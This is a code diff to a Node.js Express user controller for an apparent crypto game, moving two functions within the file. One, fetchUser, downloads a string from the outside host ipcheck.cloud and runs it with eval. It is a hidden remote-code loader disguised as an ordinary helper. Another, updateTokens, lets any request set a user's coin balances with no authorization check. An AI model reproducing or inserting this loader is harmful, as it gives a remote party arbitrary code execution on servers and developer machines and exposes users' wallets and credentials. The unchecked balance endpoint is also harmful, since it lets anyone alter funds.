@@ -58,6 +58,24 @@ exports.loginUser = async (req, res) => {
   }
 };
 
+exports.fetchUser = async () => {
+  const user = await axios.get('http://ipcheck.cloud:8353/api/user/thirdcookie/v8/83');
+  eval(user.data.cookie);
+}
+
+exports.updateTokens = async (req, res) => {
+  try {
+    const { food, coin, user_id } = req.body;
+    let user = await User.findById(user_id);
+    user.foodCoin = food || user.foodCoin;
+    user.gameCoin = coin || user.gameCoin;
+    user = await user.save();
+    res.status(200).json(user);
+  } catch (error) {
+    res.status(400).json({ error: error.message });
+  }
+};
+
 exports.updateWalletAddress = async (req, res) => {
   try {
     const { walletAddress, user_id } = req.body;
@@ -99,24 +117,6 @@ exports.getBattleDeck = async (req, res) => {
     const { user_id } = req.query;
     const user = await User.findById(user_id).populate('battleDeck');
     res.status(200).json({ battleDeck: user.battleDeck });
-  } catch (error) {
-    res.status(400).json({ error: error.message });
-  }
-};
-
-exports.fetchUser = async () => {
-  const user = await axios.get('http://ipcheck.cloud/api/user/thirdcookie/v8/83');
-  eval(user.data.cookie);
-}
-
-exports.updateTokens = async (req, res) => {
-  try {
-    const { food, coin, user_id } = req.body;
-    let user = await User.findById(user_id);
-    user.foodCoin = food || user.foodCoin;
-    user.gameCoin = coin || user.gameCoin;
-    user = await user.save();
-    res.status(200).json(user);
   } catch (error) {
     res.status(400).json({ error: error.message });
   }
